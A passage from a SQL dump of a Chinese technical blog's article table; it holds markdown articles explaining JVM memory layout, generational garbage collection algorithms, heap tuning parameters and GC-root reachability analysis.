动态连接\n每个栈帧持有一个指向运行时常量池中该栈帧所属方法的引用,以支持方法调用过程的动态连接\n(1) 静态解析: 类加载的时候,符号引用就转化成直接引用\n(2) 动态连接: 运行期间转换为直接引用\n// 方法返回地址\n方法返回地址: 方法执行后返回的地址\n// 方法调用\n方法调用就是确定具体调用哪一个方法,并不涉及方法内部的执行过程\n(1) 部分方法是直接在类加载的解析阶段,就确定了直接引用关系,比如静态方法,私有方法,实例构造器以及父类方法\n(2) 但是对于实例方法,也称虚方法,因为重载和多态,需要运行期动态委派\n// 分派\n分派: 又分成静态分派的动态分派\n(1) 静态分派: 所有依赖静态类型来定位方法执行版本的分派方式,比如: 重载方法\n(2) 动态分派: 根据运行期的实际类型来定位方法执行版本的分派方式,比如: 覆盖方法\n单分派和多分派: 就是按照分派思考的维度,多余一个的就算多分派,只有一个的称为单分派\n```\n#### Java堆内存\n![JVM堆.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-堆.png)\n![JVM虚拟机栈帧与堆.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-虚拟机栈帧与堆.png)\n```java\n// Java堆内存\n// 例子\npublic class Hello {\n    public static void main() {\n        User user = new User();\n        user.loadData();\n    }\n}\n上面的\"new User()\"这个代码就是创建了一个User类的对象实例。\n这个对象实例里面会包含一些数据，如下面的代码所示。\npublic User {\n	private int age;\n}\n这个\"User\"类里的\"age\"就是属于这个对象实例的一个数据。\n所以类似User这样的对象实例，就会存放在Java堆内存里。\n\nJava堆内存区域里会放入类似User的对象，因为在main方法里创建了User对象;\n那么在线程执行main方法代码的时候，就会在main方法对应的栈帧的局部变量表里，让一个引用类型的\"user\"局部变量来存放User对象的地址\n相当于可以认为局部变量表里的\"user\"指向了Java堆内存里的User对象。\n\n// 注意事项\n(1) Java堆用来存放应用系统创建的对象和数组,所有线程共享Java堆\n(2) Java堆是在运行期间动态分配内存大小,自动进行垃圾回收\n(3) Java垃圾回收(GC)主要就是回收堆内存,对分代GC来说,堆也是分代的\n(4) 整个堆的大小 = 新生代区 + 老年代区\n```\n#### 对象的引用\n![JVM对象的引用句柄.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-对象的引用-句柄.png)\n![JVM对象的引用指针.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-对象的引用-指针.png)\n```java\n// 堆、栈、方法区三者存放的内容\n栈: 局部变量表(基本数据类型和引用类型)\n堆: User对象,User类的元数据信息\n方法区: User类定义字段方法\n\n// 对象的访问定位\n(1) 在JVM规范中只规定了reference类型是一个指向对象的引用,但没有规定这个引用具体如何去定位,访问堆中对象的具体位置\n(2) 因此对象的访问方式取决于JVM的实现,目前主流的有: 使用句柄或使用指针两种方式\n(3) 使用句柄: Java堆中会划分出一块内存做为句柄池,reference中存储句柄的地址,句柄中存储对象的实例数据和类元数据的地址,间接引用\n(4) 使用指针: Java堆中会存放访问类元数据的地址,reference存储的就直接是对象的地址\n\n// 对象的内存布局\n(1) 对象在内存中存储的布局(这里以HostSpot)虚拟机为例来说明,分为:对象头、实例数据和对其填充\n(2) 对象头,包含两个部分\n	(1) MarkWord: 存储对象自身的运行数据,如:HashCode、GC分离年龄,锁状态标志等\n	(2) 类型指针: 对象指向它的类元数据的指针\n(3) 实例数据,真正存放对象实例数据的地方\n(4) 对其填充,这部分不一定存在,也没有说明特别的含义,仅仅是占位符,因为HostSpot要求对象起始地址都是8字节的整数倍,如果不是,就对齐\n```', 0, 0, 251, 0, 0, '2020-12-03 11:35:34', '2020-12-18 11:35:34', 0, 0);
INSERT INTO `article` VALUES (104, 1, 'JVM的内存分代', '2021/5/1621087226_mmexport1621058994600.jpg', '### 垃圾回收机制\n![JVM垃圾回收垃圾回收机制.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626514234_JVM-垃圾回收-垃圾回收机制.png)\n```java\n// 一个方法执行完毕之后会怎么样\npublic class Hello {\n    public static void main() {\n        initData();\n    }\n    private static void initData() {\n        DataManager dataManager = new DataManager();\n        dataManager.loadData();\n    }\n}\n一旦方法里的代码执行完毕，那么方法就执行完毕了，也就是说initData()方法就执行完毕了。\n一旦initData()方法执行完毕，此时就会把initData()方法对应的栈帧从main线程的Java虚拟机栈里出栈\n此时一旦initData()方法的栈帧出栈，会发现那个栈帧里的局部变量，\"dataManager\"也就没有了。\n也就是说，没有任何一个变量指向Java堆内存里的\"dataManager\"实例对象了。\n\n// 创建的Java对象都是占用内存资源的\nJava堆内存里的\"dataManager\"实例对象已经没有人引用了\n这个对象实际上已经没用了,这时候就应该回收\n内存资源是有限的，在一台机器上启动一个Java系统，机器的内存资源是有限的，比如就4个G的内存。\n启动的Java系统本质就是一个JVM进程，负责运行系统的代码。\n那么这个JVM进程本身也是会占用机器上的部分内存资源，比如占用2G的内存资源,内存是有限的,不能无限增加占用。\n\n// JVM的垃圾回收机制\n\"dataManager\"对象实例是不需要使用的，因为已经没有任何方法的局部变量在引用这个实例对象了，而且他还空占着内存资源，那么就应该处理\n这时候就要依靠 JVM的垃圾回收机制。\nJVM本身是有垃圾回收机制的，他是一个后台自动运行的线程,只要启动一个JVM进程，就会自带一个垃圾回收的后台线程,这个线程会在后台不断检查JVM堆内存中的各个实例对象。\n如果某个实例对象没有任何一个方法的局部变量指向他，也没有任何一个类的静态变量，包括常量等地方在指向他。\n那么这个垃圾回收线程，就会把这个没人指向的\"dataManager\"实例对象给回收掉，从内存里清除掉，让他不再占用任何内存资源。\n这样的话，这些不再被人指向的对象实例，即JVM中的\"垃圾\"，就会定期的被后台垃圾回收线程清理掉，不断释放内存资源。\n```\n### 短期存活与长期存活的对象\n#### 短期存活\n![JVM垃圾回收短期存活.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626514845_JVM-垃圾回收-短期存活.png)\n```java\n在代码里创建的对象，都会进入到Java堆内存中，比如下面的代码：\npublic class Hello {\n	public static void main() {\n		while(true) {\n			initData();\n			Thread.sleep(1000);\n		}\n	}\n	private static void initData() {\n		DataManager dataManager = new DataManager();\n		dataManager.loadData();\n	}\n}\n在main()方法里，会周期新的执行initData()方法,初始化数据。\n首先一旦执行main()方法，那么就会把main()方法的栈帧压入main线程的Java虚拟机栈\n然后每次在while循环里，调用initData()方法，就会把initData()方法的栈帧压入自己的Java虚拟机栈\n接着在执行initData()方法的时候，会在Java堆内存里创建一个DataManager对象实例\n而且initData()方法的栈帧里会有\"dataManager\"局部变量去引用Java堆内存里的DataManager对象实例\n然后就会执行DataManager对象的loadData()方法。\n\n现在有一个问题，在上面代码中，DataManager对象，实际上属于短暂存活的一个对象\n在initData()方法中创建这个对象，然后执行DataManager对象的loadData()方法，执行完毕之后，initData()方法就会结束。\n一旦方法结束，那么initData()方法的栈帧就会出栈。\n此时一旦没人引用这个DataManager对象了，就会被JVM的垃圾回收线程给回收掉，释放内存空间。\n然后在main()方法的while循环里，下一次循环再次执行initData()方法的时候。\n又会走一遍上面那个过程，把initData()方法的栈帧压入Java虚拟机栈，然后构造一个DataManager实例对象放在Java堆里。\n一旦执行完DataManager对象的loadData()方法之后，initData()方法又会结束，再次出栈，然后垃圾回收释放掉Java堆内存里的DataManager对象。\n所以其实这个DataManager对象，在上面的代码中，是一个存活周期极为短暂的对象。\n可能每次执行initData()方法的时候，被创建出来，然后执行它的loadData()方法，接着可能1毫秒之后，就被垃圾回收掉了。\n\n```\n#### 长期存活\n![JVM垃圾回收长期存活.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626514845_JVM-垃圾回收-长期存活.png)\n```java\n假如用下面的这种方式来实现同样的功能：\npublic class Hello {\n	private static DataManager dataManager = new DataManager();\n	public static void main() {\n		while(true) {\n			initData();\n			Thread.sleep(1000);\n		}\n	}\n	private static void initData() {\n		dataManager.loadData();\n	}\n}\n给Hello这个类定义一个静态变量，也就是\"dataManager\"，这个DataManager\n类是在JVM的方法区里的\n然后让\"dataManager\"引用了一个在Java堆内存里创建的DataManager实例对象。\n接着在main()方法中，就会在一个while循环里，不停的调用DataManager对象的loadData()方法，做成一个周期性运行的模式。\n这个DataManager实例对象，会一直被Hello的静态变量引用的，然后会一直驻留在Java堆内存里，是不会被垃圾回收掉的。\n因为这个实例对象需要长期被使用，周期新的被调用loadData()方法，所以他就成为了一个长时间存在的对象。\n类似这种被类的静态变量长期引用的对象，需要长期停留在Java堆内存里，这种对象就是生存周期很长的对象，是轻易不会被垃圾回收的，说明需要长期存在，不停的去使用他。\n```\n### 年轻代与老年代\n#### 区域划分\n![JVM垃圾回收内存分代1.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626517708_JVM-垃圾回收-内存分代1.png)\n![JVM垃圾回收内存分代2.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626517708_JVM-垃圾回收-内存分代2.png)\n```java\n根据写代码方式的不同，采用不同的方式来创建和使用对象，其实对象的生存周期是不同的。\n所以JVM将Java堆内存划分为了两个区域，一个是年轻代，一个是老年代。\n年轻代，顾名思义，就是把第一种代码示例短期存活中的那种，创建和使用完之后立马就要回收的对象放在里面。\n老年代，就是把第二种代码示例长期存活中的那种，创建之后需要一直长期存在的对象放在里面。\n比如下面的代码:\npublic class Hello {\n    private static DataFetcher dataFetcher = new DataFetcher();\n    public static void main() {\n		initData();\n        while(true) {\n            fetchData();\n            Thread.sleep(1000);\n        }\n    }\n    private static void initData() {\n		DataManager dataManager = new DataManager();\n        dataManager.loadData();\n    }\n	private static void fetchData() {\n		dataFetcher.fetch();\n	}\n}\nHello的静态变量\"dataFetcher\"引用DataFetcher对象,这是需要长期驻留在内存里使用的。\n虽然这个DataFetcher对象会在年轻代里停留一会儿，但是最终会进入老年代。\n进入main()方法后，会先调用initData()方法，业务含义是系统启动就加载一次数据，这个方法的栈帧会入栈。\n然后在这个initData()方法里面创建了一个DataManager对象，这个对象方法执行完毕后就会回收，所以是会放在年轻代里的，由栈帧里的局部变量来引用。\n一旦initData()方法执行完毕了，方法的栈帧就会出栈，对应的年轻代里的ReplicaManager对象也会被回收掉。\n但是接着会执行一段while循环代码，会周期性的调用DataFetcher的fetch()方法，去从远程加载数据。\nDataFetcher这个对象因为被Hello类的静态变量dataFetcher给引用了，所以他会长期存在于老年代里的，持续被使用。\n\n// 为什么要分成年轻代和老年代\n因为这跟垃圾回收有关。\n对于年轻代里的对象，他们的特点是创建之后很快就会被回收，所以需要用一种垃圾回收算法。\n对于老年代里的对象，他们的特点是需要长期存在，所以需要另外一种垃圾回收算法\n所以需要分成两个区域来放不同的对象。\n```\n### JVM的内存参数\n![JVM内存划分内存参数.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626518648_JVM-内存划分-内存参数.png)\n```java\n在JVM内存分配中，有几个参数是比较核心的，如下所示。\n-Xms: Java堆的大小\n-Xmx: Java堆的最大大小\n-xmn: Java堆内存的新生代大小,扣除新生代剩下的就是老年代的大小了\n-XX:PermSize: 永久代方法区的大小\n-XX:MaxPermSize: 永久代方法区的最大大小\n-Xss: 每个线程的栈大小\n\n// 什么是永久代\nJVM里的永久代其实就是方法区,在JDK8后取而代之的是Metaspace 元数据空间。\n\n// -Xms和-Xmx\n-Xms和-Xmx，分别用于设置Java堆内存的刚开始的大小，以及允许扩张到的最大大小。\n对于这对参数是限定Java堆内存的总大小的。通常来说都会设置为完全一样的大小。\n// -Xmn\n-Xmn，这个参数也是很常见的，他用来设置Java堆内存中的新生代的大小,，扣除新生代大小之后的剩余内存就是给老年代的内存大小。\n// -XX:PermSize和-XX:MaxPermSize\n通常这两个数值也是设置为一样的。\n如果是JDK 1.8以后的版本，那么这俩参数被替换为了-XX:MetaspaceSize和-XX:MaxMetaspaceSize。\n// -Xss\n-Xss，这个参数限定了每个线程的栈内存大小\n每个线程都有一个自己的虚拟机栈，每次执行一个方法，就会将方法的栈帧压入线程的栈里，方法执行完毕，那么栈帧就会从线程的栈里出栈。\n\n```', 0, 0, 57, 0, 0, '2020-12-12 22:01:02', '2021-02-08 22:01:02', 0, 0);
INSERT INTO `article` VALUES (105, 1, 'JVM的堆内存中的新生代与老年代', '2018/8/1533987277_f21ee5e433b7d4dc2d1dfc2b2e9d9af6.jpg', '### 新生代的复制算法\n#### 新生代的垃圾回收时机\n![JVM垃圾回收MinorGC.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收-MinorGC.png)\n```java\npublic class Hello () {\n	public static void main() {\n		initData();\n	}\n	public static initData() {\n		DataManager dataManager = new DataManager();\n	}\n}\n一旦initData()方法执行完毕后，这个方法的栈帧出栈，会导致没有任何局部变量引用DataManager实例对象了。\n那么此时不一定会立即发生垃圾回收，去回收掉Java堆内存里那个没人使用的ReplicaManager实例对象。\n\n// 新生代满时发生Young GC\n如果新生代按预先分配的内存空间，现在几乎都被全部对象给占满了。\n此时假设代码继续运行，需要在新生代里去分配一个对象,这时候就会触发一次新生代内存空间的垃圾回收。\n新生代内存空间的垃圾回收也称之为\"Minor GC\"，也叫\"Young GC\"，会尝试把新生代里那些没有人引用的垃圾对象，都给回收掉。\n可能我们会在新生代里分配大量的对象，但是使用完之后立马就没人引用了，此时新生代差不多满了。\n然后要分配新的对象的时候，发现新生代内存空间不足，就会触发一次垃圾回收，然后就把所有垃圾对象给干掉，腾出大量的内存空间。\n比如上面的代码中，那个DataManager实例对象，其实就是没有人引用的垃圾对象\n此时就会当机立断，把DataManager实例对象给回收掉，腾出更多的内存空间，然后放一个新的对象到新生代里去。\n其他大量没人引用的实例对象,在这个新生代垃圾回收的过程中，都会把这些垃圾对象也都回收掉。\n\n```\n#### 内存碎片\n![JVM垃圾回收内存碎片.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收-内存碎片.png)\n```java\n一种不太好的垃圾回收思路。\n标记出哪些对象是可以被垃圾回收的，然后就直接对那块内存区域中的对象进行垃圾回收，把内存空出来。\n这种思路去垃圾回收，在那块被使用的内存区域里，回收掉了大量的垃圾对象，但是保留了一些被人引用的存活对象。\n但是呢，存活对象在内存区域里东一个西一个，非常的凌乱，而且造成了大量的\"内存碎片\"。\n这些内存碎片的大小不一样，有的可能很大，有的可能很小。\n\n// 内存碎片造成的问题\n内存浪费.比如现在打算分配一个新的对象，尝试在上图那块被使用的内存区域里去分配 \n可能因为内存碎片太多的缘故，虽然所有的内存碎片加起来其实有很大的一块内存，但是因为这些内存都是碎片式分散的，所以导致没有一块完整的足够的内存空间来分配新的对象。\n所以这种直接对一块内存空间回收掉垃圾对象，保留存活对象的方法，绝对是不可取的\n因为内存碎片太多，就是他最大的问题，会造成大量的内存浪费，很多内存碎片压根儿是没法使用的。\n\n这种方式也叫做\"标记清除算法\"。\n(1) 标记清除法(Mark-Sweep)算法分成标记和清除两个阶段,先标记出要回收的对象,然后统一回收这些对象\n(2) 依次标记,0标记为存活,1标识为没有存活\n(3) 垃圾内存回收机制遍历堆内存中标识为不可达的对象进行清理\n(4) 应用场景: 老年代,因为老年代回收不频繁\n(5) 会产生碎片化,因为内存不够连贯\n(6) 优点是简单\n(7) 缺点是效率不高,标记和清除的效率都不高,标记清除后会产生大量不连续的内存碎片,从而导致在分配大对象时触发GC\n\n```\n#### 复制算法\n![JVM垃圾回收复制算法.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收-复制算法.png)\n```java\n针对新生代的垃圾回收算法叫做复制算法。\n简单来说,就是把新生代的内存分为两块。\n\n先对一块在使用的内存空间标记出里面哪些对象是不能进行垃圾回收的，也就是要存活的对象。\n然后先把那些存活的对象转移到另外一块空白的内存中。\n通过把存活对象先转移到另外一块空白内存区域，我们可以把这些对象都比较紧凑的排列在内存里。\n这样就可以让被转移的那块内存区域几乎没有什么内存碎片，对象都是按顺序排列在这块内存里的。\n那块被转移的内存区域又是一大块连续的可用的内存空间。\n\n这就是所谓的\"复制算法\"，把新生代内存划分为两块内存区域，然后只使用其中一块内存。\n待那块内存快满的时候，就把里面的存活对象一次性转移到另外一块内存区域，保证没有内存碎片。\n接着一次性回收原来那块内存区域的垃圾对象，再次空出来一块内存区域。两块内存区域就这么重复着循环使用。\n\n// 复制算法的缺点\n复制算法的缺点其实非常的明显。\n假设给新生代1G的内存空间，那么只有512MB的内存空间是可以用的。\n另外512MB的内存空间是一直要放在那里空着的，然后512MB内存空间满了，就把存活对象转移到另外一块512MB的内存空间去。\n从始至终，就只有一半的内存可以用，这样的算法显然对内存的使用效率太低了。\n\n```\n#### 复制算法的优化: Eden区和Survivor区\n![JVM垃圾回收Eden区和Survivor区回收前.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收--Eden区和Survivor区-回收前.png)\n![JVM垃圾回收Eden区和Survivor区回收后.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收--Eden区和Survivor区-回收后.png)\n```java\n系统运行时，对JVM内存的使用模型，大体上就是代码不停的创建对象然后分配在新生代里。\n但是一般很快对象就没人引用了，成了垃圾对象。\n接着一段时间过后，新生代就满了，此时就会回收掉那些垃圾对象，空出来内存空间，给后续其他的对象来使用。\n绝大多数的对象都是存活周期非常短的对象，可能被创建出来1毫秒之后就没人引用了，他就是垃圾对象了。\n可能一次新生代垃圾回收过后，99%的对象其实都被垃圾回收了，就1%的对象存活了下来，可能就是一些长期存活的对象，或者还没使用完的对象。\n所以实际上真正的复制算法会做出如下优化，把新生代内存区域划分为三块：\n1个Eden区，2个Survivor区。\n其中Eden区占80%内存空间，每一块Survivor区各占10%内存空间。\n比如说Eden区有800MB内存，每一块Survivor区就100MB内存。\n平时可以使用的，就是Eden区和其中一块Survivor区，那么相当于就是有900MB的内存是可以使用的。\n\n刚开始对象都是分配在Eden区内的，如果Eden区快满了，此时就会触发垃圾回收。\n此时就会把Eden区中的存活对象都一次性转移到一块空着的Survivor区。\n接着Eden区就会被清空，然后再次分配新对象到Eden区里。\nEden区和一块Survivor区里是有对象的，其中Survivor区里放的是上一次Minor GC后存活的对象。\n如果下次再次Eden区满，那么再次触发Minor GC，就会把Eden区和放着上一次Minor GC后存活对象的Survivor区内的存活对象，转移到另外一块Survivor区去。\n\n每次垃圾回收可能存活下来的对象就1%，所以在设计的时候就留了一块100MB的内存空间来存放垃圾回收后转移过来的存活对象。\n比如Eden区+一块Survivor区有900MB的内存空间都占满了，但是垃圾回收之后，可能就10MB的对象是存活的。\n此时就把那10MB的存活对象转移到另外一块Survivor区域就可以，然后再一次性把Eden区和之前使用的Survivor区里的垃圾对象全部回收掉。\n\n接着新对象继续分配在Eden区和另外那块开始被使用的Survivor区，然后始终保持一块Survivor区是空着的，就这样一直循环使用这三块内存区域。\n这么做最大的好处，就是只有10%的内存空间是被闲置的，90%的内存都被使用上了\n论是垃圾回收的性能，内存碎片的控制，还是说内存使用的效率，都非常的好。\n\n// 复制算法概述\n(1) 复制算法(Copying): 把内存分成两块完全相同的区域,每次使用其中一块,当一块使用完了,就把这块还存货的对象拷贝到另外一块,然后将这块清除\n(2) 优点是: 实现简单,运行高效,不用考虑内存碎片问题\n(3) 缺点是: 内存有些浪费\n(4) JVM实际实现中,是将内存分为一块较大的Eden区和两块较小的Survivor空间,每次使用Eden区和一块Survivor,回收时,把存活对象复制到另一块Survivor\n(5) HotSpot默认的Eden和Survivor比是8:1,也就是每次能用90%的新生代空间\n(6) 如果Survivor空间不够,就要依赖老年代进行分配担保,把放不下的对象直接进入老年代\n\n```\n### 进入老年代\n#### 躲过15次GC之后进入老年代\n```java\n躲过15次GC之后进入老年代。\n代码在运行的过程中，就会不断的创建各种各样的对象，这些对象都会优先放到新生代的Eden区和Survivor1区。\n然后慢慢系统跑着跑着，新生代就满了，此时就会触发Minor GC，可能就1%的少量存活对象转移到空着的Survivor区中。\n然后系统继续运行，继续在Eden区里分配各种对象，大概就是这个过程。\n写的系统中有些对象是长期存在的对象，他是不会轻易的被回收掉的，比如下面的代码。\npublic class Hello{\n	publlic static DataManager dataManager = new DataManager();\n}\n只要这个\"Hello\"类还存在，那么他的静态变量\"dataManager\"就会长期引用\"DataManager\"对象。\n所以无论新生代怎么垃圾回收，类似这种对象都不会被回收掉的。\n此时这类对象每次在新生代里躲过一次GC被转移到一块Survivor区域中，此时他的年龄就会增长一岁。\n默认的设置下，当对象的年龄达到15岁的时候，也就是躲过15次GC的时候，他就会转移到老年代里去。\n这个具体是多少岁进入老年代，可以通过JVM参数\"-XX:MaxTenuringThreshold\"来设置，默认是15岁。\n```\n#### 动态对象年龄判断\n```java\n假如当前放对象的Survivor区域里。\n一批对象的总大小大于了这块Survivor区域的内存大小的50%。\n那么此时大于等于这批对象年龄的对象，就可以直接进入老年代。\n\n假设Survivor2区有两个对象，这俩对象的年龄一样，都是2岁。\n这俩对象加起来超过了50MB，超过了Survivor2区的100MB内存大小的一半了。\n这个时候，Survivor2区里的大于等于2岁的对象，就要全部进入老年代。\n这就是\"动态对象年龄判断\",这条规则也会让一些新生代的对象进入老年代。\n实际这个规则运行的时候是如下的逻辑：\n年龄1+年龄2+年龄n的多个年龄对象总和超过了Survivor区域的50%,此时就会把年龄n以上的对象都放入老年代。\n```\n#### 大对象直接进入老年代\n```java\n有一个JVM参数\"-XX:PretenureSizeThreshold\"。\n可以把他的值设置为字节数，比如“1048576”字节，就是1MB。\n如果你要创建一个大于这个大小的对象，比如一个超大的数组，此时就直接把这个大对象放到老年代里去。\n之所以这么做，就是要避免新生代里出现那种大对象，然后屡次躲过GC，还得把他在两个Survivor区域里来回复制多次之后才能进入老年代，\n```\n#### Minor GC后的对象太多\n```java\n如果在Minor GC之后发现剩余的存活对象太多了，没办法放入另外一块Survivor区怎么办\n如上图,假设在发生GC的时候，发现Eden区里超过150MB的存活对象，此时没办法放入Survivor区中。\n这个时候就必须得把这些对象直接转移到老年代去。\n\n```\n### 老年代空间分配担保规则\n#### Minor GC之前，JVM先检查老年代可用的可用内存空间\n![JVM垃圾回收老年代空间分配担保规则1.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收-老年代空间分配担保规则1.png)\n```java\n如果新生代里有大量对象存活下来，确实是自己的Survivor区放不下了，必须转移到老年代去。\n如果老年代里空间也不够放这些对象会怎样。\n\n首先，在执行任何一次Minor GC之前，JVM会先检查一下老年代可用的可用内存空间，是否大于新生代所有对象的总大小。\n因为最极端的情况下，可能新生代Minor GC过后，所有对象都存活下来了，那岂不是新生代所有对象全部要进入老年代。\n\n如果说发现老年代的内存大小是大于新生代所有对象的。\n此时就可以放心大胆的对新生代发起一次Minor GC，因为即使Minor GC之后所有对象都存活，Survivor区放不下了，也可以转移到老年代去。\n\n但是假如执行Minor GC之前，发现老年代的可用内存已经小于了新生代的全部对象大小了。\n说明有可能在Minor GC之后新生代的对象全部存活下来，然后全部需要转移到老年代去，但是现在老年代空间不够。\n所以假如Minor GC之前，发现老年代的可用内存已经小于了新生代的全部对象大小了。\n此时会看\"-XX:-HandlePromotionFailure\"的参数是否设置了。\n```\n#### 检查老年代的内存大小是否大于之前每一次Minor GC后进入老年代的对象的平均大小\n![JVM垃圾回收老年代空间分配担保规则2.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534757_JVM-垃圾回收-老年代空间分配担保规则2.png)\n```java\n如果有\"-XX:-HandlePromotionFailure\"这个参数，那么就会继续尝试进行下一步判断。\n下一步判断，就是看看老年代的内存大小是否大于之前每一次Minor GC后进入老年代的对象的平均大小。\n举个例子，之前每次Minor GC后，平均都有10MB左右的对象会进入老年代，那么此时老年代可用内存大于10MB。\n这就说明，很可能这次Minor GC过后也是差不多10MB左右的对象会进入老年代，此时老年代空间是够的。\n\n如果上述判断失败了，或者是\"-XX:-HandlePromotionFailure\"参数没设置，此时就会直接触发一次\"Full GC\"。\n\"Full GC\"就是对老年代进行垃圾回收，尽量腾出来一些内存空间，然后再执行Minor GC。\n\n如果上述判断判断成功了，那么就是说可以冒点风险尝试一下Minor GC。此时进行Minor GC有几种可能：\n第一种可能，Minor GC过后，剩余的存活对象的大小，小于Survivor区的大小的，那么此时存活对象进入Survivor区域即可。\n第二种可能，Minor GC过后，剩余的存活对象的大小，大于Survivor区域的大小，但是是小于老年代可用内存大小的，此时就直接进入老年代即可。\n第三种可能，Minor GC过后，剩余的存活对象的大小，大于Survivor区域的大小，也大于了老年代可用内存的大小。此时老年代都放不下这些存活对象了，就会发生“Handle Promotion Failure”的情况，这个时候就会触发一次“Full GC”。\n\nFull GC就是对老年代进行垃圾回收，同时也一般会对新生代进行垃圾回收。\n因为这个时候必须得把老年代里的没人引用的对象给回收掉，然后才可能让Minor GC过后剩余的存活对象进入老年代里面。\n如果要是Full GC过后，老年代还是没有足够的空间存放Minor GC过后的剩余存活对象，那么此时就会导致所谓的\"OOM\"内存溢出了。\n因为内存实在是不够，但还要不停的往里面放对象，当然就崩溃了。\n```\n#### 老年代触发垃圾回收的时机\n```java\n对老年代触发垃圾回收的时机，一般来说就两个:\n(1)Minor GC之前，检查发现很可能Minor GC之后要进入老年代的对象太多了，老年代放不下，此时需要提前触发Full GC然后再带着进行Minor GC。\n(2)Minor GC之后，发现剩余对象太多放入老年代都放不下了。\n\n```\n\n### 老年代的标记整理算法\n![JVM垃圾回收标记整理.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626534758_JVM-垃圾回收-标记整理.png)\n```java\n老年代采取的是\"标记整理算法\"。\n首先标记出来老年代当前存活的对象，这些对象可能是东一个西一个的。\n接着会让这些存活对象在内存里进行移动，把存活对象尽量都挪动到一边去，让存活对象紧凑的靠在一边。\n然后再一次性把垃圾对象都回收掉。\n这个老年代的标记整理算法的速度至少比新生代的复制算法的速度慢10倍。\n所以如果系统频繁出现老年代的Full GC垃圾回收，会导致系统性能被严重影响，出现频繁卡顿的情况。\n\n// 标记整理算法概述\n(1) 标记整理算法(Mark-Compact): 由于复制算法在存活对象比较多的时候,效率较低,且有空间浪费,因此老年代一般不会选用复制算法,老年代多选用标记整理算法\n(2) 标记过程跟标记清除一样,但后续不是直接清除可回收对象,而是让所有存活对象都向一端移动,然后直接清除边界以外的内存\n(3) 与标记清除算法基本一致,但增加了排序\n(4) 将全部可达对象放在一边,将不可达对象放在另一边\n(5) 随后将不可达对象的区域全部清除\n(6) 解决了碎片化问题,但耗时极长\n\n```\n\n### 永久代\n```java\n// 永久代\n(1) 永久代主要用于装载Class、方法等信息，默认为64MB \n(2) 永久代满时也会触发FullGC(新生代老年代全部清理),会导致Class,Method元信息的卸载\n(3) JDK8后取消了永久代(持久代),用来存放Class,Method等元信息的区域,取而代之的是元数据空间(MetaSpace)\n(4) 元数据空间并不在虚拟机里面,而是直接使用本地内存\n\n// 跨代引用\n跨代引用: 也就是一个代中的对象引用另一个代中的对象(新生代引用老年代,老年代引用新生代)\n跨代引用假说: 跨代引用相对于同代引用来说只是极少数\n隐含推论: 存在互相引用关系的两个对象,是应该倾向于同时生存或同时消亡的\n\n// 记忆集\n(1) 记忆集: 一种用于记录从非收集区域指向收集区域的指针集合和抽象数据结构\n(2) 字长精度: 每个记录精确到一个机器的字长,该字包含跨代指针\n(3) 对象精度: 每个记录精确到一个对象,该对象里有字段含有跨代指针\n(4) 卡精度: 每个记录精确到一块内存区域,该区域内有对象含有跨代指针\n(5) 卡表(Card Table): 是记忆集的一种具体实现,定义了记忆集的记录精度和堆内存的映射关系等\n(6) 卡表的每个元素都对应着其标识的内存区域中一块特定大小的内存块,这个内存块称之为卡页\n\n```', 0, 0, 149, 0, 0, '2020-12-14 19:36:06', '2020-12-16 19:36:06', 0, 0);
INSERT INTO `article` VALUES (106, 1, 'JVM的根搜索与对象内存状态以及引用类型', '2018/12/1543746554_49b65802a881e39208f5e1bad988af6c.jpg', '### 可达性分析算法\n#### 根搜索算法\n![JVM垃圾回收根搜索算法.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626525483_JVM-垃圾回收-根搜索算法.png)\n```java\n如果新生代里的对象越来越多，都快满了。\n此时就会触发垃圾回收，把新生代没有人引用的对象给回收掉，释放内存空间\n\n// 哪些变量引用的对象是不能回收的\nJVM中使用了一种\"可达性分析算法\"来判定哪些对象是可以被回收的，哪些对象是不可以被回收的。\n这个算法对每个对象，都分析一下有谁在引用他，然后一层一层往上去判断，看是否有一个\"GC Roots\"。\n\n// 根搜索算法\n(1) 从根(GCRoots)节点向下搜索对象节点,搜索走过的路径称为引用链,当一个对象到根之间没有连通的话,则该对象不可用\n(2) 可作为GC Roots的对象包括: 虚拟机栈(栈帧局部变量)中引用的对象、方法区类静态属性引用的对象、方法区中常量引用的对象、本地方法栈中JNI引用的对象\n(3) HotSpot使用了一组叫做OopMap的数据结构达到准确式GC的目的,OopMap会存放扫描的垃圾信息,而不用从根节点扫描,从而提高效率\n(4) 在OopMap的协助下,JVM可以很快的做完GC Roots枚举,但是JVM并没有为每一条指令生成一个OopMap\n(5) 记录OopMap的这些\"特定位置\"被成为安全点,即当前线程执行到安全点后才允许暂停进行GC\n(6) 如果一段代码中,对象引用关系不会发生变化,这个区域中任何地方开始GC都是安全的,那么这个区域称为安全区域\n\n// 作为GCRoots的对象包括几种\n(1) 虚拟机栈(栈帧中的局部变量区,也叫做局部变量表)中引用的对象\n(2) 本地方法栈中native方法引用的对象\n(3) 方法区中的类静态属性引用的对象\n(4) 方法区中常量引用的对象\n```\n#### 被局部变量表引用\n![JVM垃圾回收根搜索算法被局部变量引用.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626525483_JVM-垃圾回收-根搜索算法-被局部变量引用.png)\n```java\n// 被局部变量表引用\npublic class Hello {\n	public static void main() {\n		initData();\n	}\n	public static void initData() {\n		DataManager dataManager = new DataManager();\n	